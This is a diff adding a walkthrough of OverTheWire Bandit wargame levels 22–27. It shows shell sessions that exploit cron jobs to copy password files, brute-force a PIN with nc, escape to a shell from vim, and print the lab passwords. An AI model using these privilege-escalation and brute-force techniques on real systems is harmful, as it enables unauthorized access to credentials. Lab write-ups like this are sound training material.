@@ -205,4 +205,115 @@ WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
 
 level22- level23
 ```shell
+bandit22@bandit:~$ cd /etc/cron.d/
+bandit22@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+```
+
+level23 - level24
+```shell
+bandit23@bandit:/usr/bin$ cd /etc/cron.d/
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+dones
+```
+
+The access permission of the tmp folder matters.
+We need to give out the write permission for bandit24.
+
+```shell
+bandit23@bandit:/tmp/xi$ ls -al
+total 2132
+drwxrwxr-x 2 bandit23 bandit23    4096 Oct 28 20:01 .
+drwxrwx-wt 1 root     root     2166784 Oct 28 20:03 ..
+-rw-rw-r-- 1 bandit23 bandit23       0 Oct 28 20:01 bandit24_pass.txt
+-rwxrwxrwx 1 bandit23 bandit23     102 Oct 28 19:55 test.sh
+-rw-rw-r-- 1 bandit23 bandit23       0 Oct 28 20:01 test.txt
+bandit23@bandit:/tmp/xi$ chmod 777 .
+bandit23@bandit:/tmp/xi$ ls -al
+total 2132
+drwxrwxrwx 2 bandit23 bandit23    4096 Oct 28 20:01 .
+drwxrwx-wt 1 root     root     2166784 Oct 28 20:03 ..
+-rw-rw-r-- 1 bandit23 bandit23       0 Oct 28 20:01 bandit24_pass.txt
+-rwxrwxrwx 1 bandit23 bandit23     102 Oct 28 19:55 test.sh
+-rw-rw-r-- 1 bandit23 bandit23       0 Oct 28 20:01 test.txt
+bandit23@bandit:/tmp/xi$ cp test.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/xi$ cat /var/spool/bandit24/foo/test.sh
+#!/bin/bash
+echo "test"  > /tmp/xi/test.txt
+cat /etc/bandit_pass/bandit24 > /tmp/xi/bandit24_pass.txt
+bandit23@bandit:/tmp/xi$ ls -l
+total 12
+-rwxrwxrwx 1 bandit23 bandit23  33 Oct 28 20:06 bandit24_pass.txt
+-rwxrwxrwx 1 bandit23 bandit23 102 Oct 28 19:55 test.sh
+-rwxrwxrwx 1 bandit23 bandit23   5 Oct 28 20:06 test.txt
+bandit23@bandit:/tmp/xi$ cat bandit24_pass.txt
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
+level24 - level25
+```shell
+bandit24@bandit:/tmp/tmp.ezC2VPgMil$ ls
+a.py  list.txt  result.log  result.txt
+bandit24@bandit:/tmp/tmp.ezC2VPgMil$ cat a.py
+bandit24_pass = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+with open('list.txt', 'w') as file:
+    for i in range(0, 9999):
+        file.write('{} {}\n'.format(bandit24_pass, str(i).zfill(4)))
+bandit24@bandit:/tmp/tmp.ezC2VPgMil$ python3 a.py
+bandit24@bandit:/tmp/tmp.ezC2VPgMil$ cat list.txt | nc localhost 30002 > result.txt
+bandit24@bandit:/tmp/tmp.ezC2VPgMil$ cat result.txt  | grep pass
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+
+level25 - level26 - level27
+Change the size of the terminal, go into the vim by typing `v`.
+```shell
+:set shell = /bin/bash
+:terminal
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+```
+
+level27 - level28
+```shell
+
 ```
